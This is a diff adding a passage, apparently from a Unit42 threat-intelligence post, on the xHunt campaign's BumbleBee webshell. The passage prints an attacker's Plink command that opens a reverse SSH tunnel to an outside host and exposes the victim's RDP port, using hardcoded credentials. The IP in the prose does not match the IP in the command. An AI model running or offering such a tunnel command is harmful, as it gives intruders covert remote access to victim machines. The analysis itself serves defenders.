@@ -1,0 +1,5 @@
+Unit42:bumblebee-webshell-xhunt-campaign - The commands listed in Table 2 in the Appendix also show the actor using Plink (File: RTQ.exe) to create an SSH tunnel to an external IP address (IP: 10.13.232[.]89), as seen in the following command:
+
+echo y | c:\windows\temp\RTQ.exe 10.119.110[.]194 -C -R 0.0.0.0:8081::3389 -l bor -pw 123321 -P 443
+
+The IP address overlaps with other related infrastructure that we will discuss in a later section of this blog. Most importantly, the username and password of bor and 123321 used to create the SSH tunnel overlaps directly with prior xHunt activity. These exact credentials were listed within the cheat sheet found within the Sakabota tool, which provided an example command that the actor could use to create SSH tunnels using Plink. We believe the actor used the example command from the cheat sheet as a basis for the commands they used to create the SSH tunnels via BumbleBee.
